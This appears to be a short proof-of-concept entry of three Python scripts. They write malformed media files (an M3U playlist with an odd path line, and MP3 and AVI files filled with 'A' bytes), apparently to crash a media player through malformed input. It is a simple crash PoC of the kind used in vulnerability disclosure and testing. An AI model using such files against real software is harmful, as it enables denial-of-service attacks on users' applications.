# --- m3u ----------------------------------------------
#!/usr/bin/python
junk = "#EXTM3U\n"
junk += "#EXTINF:666, 0dem, 0dem\n"
junk += "c:\\A"
 
file = open("PoC.m3u","w")
file.writelines(junk)
file.close()
 
# --- mp3 -----------------------------------------------
#!/usr/bin/python
junk = "\x41" * 100
file = open("PoC.mp3","w")
file.writelines(junk)
file.close()
 
# --- avi -----------------------------------------------
#!/usr/bin/python
junk = "\x41" * 100
file = open("PoC.avi","w")
file.writelines(junk)
file.close()
